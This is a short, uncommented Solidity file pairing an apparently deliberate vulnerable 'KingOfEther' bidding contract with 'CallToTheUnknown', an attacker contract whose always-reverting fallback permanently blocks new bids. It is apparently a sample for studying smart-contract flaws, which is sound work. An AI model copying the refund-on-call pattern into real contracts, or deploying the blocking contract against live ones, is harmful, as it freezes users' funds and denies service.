pragma solidity ^0.4.18;
contract KingOfEther {
    address public king;
    uint public king_Bid;

    modifier onlyKing{
        require(msg.sender == king);
        _;
    }

    function KingOfEther() public payable{
        king = msg.sender;
        king_Bid = 0.1 ether;
    }

    function() public payable {
        require(msg.value > king_Bid);
        if(!king.call.value(king_Bid)()){
            revert();
        }
        king = msg.sender;
        king_Bid = msg.value * 2;
    }

    function getbalance() public onlyKing{
        require(king.send(this.balance));
    }
}

contract CallToTheUnknown {

  function BecomeKing(address _address, uint Amount)public {
        if(!_address.call.value(Amount)())
        revert();
  }

  function CallToTheUnknown() public payable{}

  function() public payable {
        revert();
  }
}
